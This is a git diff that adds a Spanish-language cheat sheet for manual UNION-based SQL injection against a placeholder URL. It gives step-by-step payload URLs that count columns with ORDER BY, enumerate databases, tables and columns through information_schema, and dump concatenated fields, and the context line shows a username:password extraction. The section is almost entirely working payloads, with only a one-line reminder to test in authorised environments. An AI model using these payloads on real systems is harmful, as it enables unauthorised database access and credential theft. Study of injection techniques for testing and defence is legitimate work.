@@ -304,6 +304,83 @@ http://ejemplo.com/product.php?id=1 UNION SELECT CONCAT(username, 0x3a, password
 
 ---
 
+# 📌 Resumen de Ataque Manual SQLi
+
+---
+
+## 1️⃣ Averiguar el número de columnas
+
+Probar con:
+
+http://ejemplo.com/product.php?id=1 ORDER BY 100-- -
+
+Si aparece un error como:
+
+ORDER BY clause error
+
+Vamos disminuyendo el número hasta que el error desaparezca.  
+El último número que no genera error indica el número de columnas.
+
+---
+
+## 2️⃣ Probar UNION SELECT con el número de columnas encontrado
+
+Ejemplo si hay 5 columnas:
+
+http://ejemplo.com/product.php?id=1 UNION SELECT 1,2,3,4,5-- -
+
+Si aparece algún número en la página, se puede reemplazar por funciones o datos.
+
+Ejemplo para obtener el nombre de la base de datos actual:
+
+http://ejemplo.com/product.php?id=1 UNION SELECT 1,DATABASE(),3,4,5-- -
+
+---
+
+## 3️⃣ Listar bases de datos
+
+http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata-- -
+
+Si no muestra todas las bases de datos o da error, podemos paginar con LIMIT:
+
+http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata LIMIT 0,1-- -
+http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata LIMIT 1,1-- -
+http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata LIMIT 2,1-- -
+...
+
+---
+
+## 4️⃣ Listar nombres de las tablas de una base de datos
+
+http://ejemplo.com/product.php?id=1 UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema="<NOMBRE_BASE_DATOS>"-- -
+
+---
+
+## 5️⃣ Listar nombres de las columnas de una tabla
+
+http://ejemplo.com/product.php?id=1 UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema="<NOMBRE_BASE_DATOS>" AND table_name="<NOMBRE_TABLA>"-- -
+
+---
+
+## 6️⃣ Mostrar datos concatenados
+
+Esto permite mostrar múltiples columnas en un solo campo visualizado:
+
+http://ejemplo.com/product.php?id=1 UNION SELECT 1,CONCAT(<COLUMNA1>,0x3a,<COLUMNA2>),3,4,5 FROM <NOMBRE_BASE_DATOS>.<NOMBRE_TABLA>-- -
+
+(0x3a representa el carácter ":")
+
+---
+
+## ✅ Notas
+
+- Adaptar el número de columnas a las de la consulta original.
+- Usar `-- -` o `#` para comentar el resto de la consulta original.
+- Probar siempre en entornos de prueba autorizados.
+
+---
+
+
 
 
 
